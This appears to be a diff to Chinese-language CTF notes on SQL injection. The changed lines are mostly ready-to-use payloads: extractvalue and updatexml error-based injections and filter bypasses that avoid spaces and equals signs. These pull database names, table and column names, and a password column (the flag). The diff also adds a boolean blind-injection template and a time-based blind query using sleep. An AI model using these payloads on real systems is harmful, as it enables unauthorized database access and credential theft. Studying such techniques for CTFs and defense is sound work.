@@ -73,10 +73,16 @@ for i in range(1,50):
 - 关键字过滤可以用大小写、多重关键字、/**/、concat绕过
     - select、union、sleep、information_schema
     - table、and、or
-- 用extractvalue报错注入
-    - `1' and (extractvalue(1,concat(0x7e,user(),0x7e)));#`
-    - `1' and (extractvalue(1,concat(0x7e,database(),0x7e)));#`
-    - `1' and (extractvalue(1,concat(0x7e,version(),0x7e)));#`
+- 用extractvalue或updatexml报错注入，连接词可以为```and、or、||、&&、^```，末尾可能需要加`%23`，#的url编码。
+    - 举一个updatexml的例子，其他与extractvalue相同，`1' and updatexml(1,concat(0x7e,user(),0x7e),1)%23`
+    - `1' and extractvalue(1,concat(0x7e,user(),0x7e))%23`
+    - `1' and extractvalue(1,concat(0x7e,database(),0x7e))%23`
+    - `1' and extractvalue(1,concat(0x7e,version(),0x7e))%23`
+    - 无空格、无等号，获得表名 `1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e))%23`
+    - 无空格、无等号，获得列名 `1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e))%23`
+    - 无空格，正序获得flag`1'^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e))%23`
+    - 无空格，逆序获得flag`1'^extractvalue(1,concat(0x7e,reverse((select(group_concat(password))from(H4rDsq1))),0x7e))%23`
+- 普通盲注`"1 and if(ascii(substr((database()),{},1))>{},1,0)%23".format(i, mid)`
 - 时间盲注需要用到sleep(n)，盲注通用语句
     - `sql="select(if(ascii(mid((select group_concat(schema_name) from information_schema.schemata),{},1))={},sleep(3),0))".format(str(num), str(ord(char)))`
 - 进一步的关键字都被过滤，时间盲注关键字也无效，考虑SQL语句的转码。使用**堆叠注入**的方式执行**16进制编码的SQL语句**。
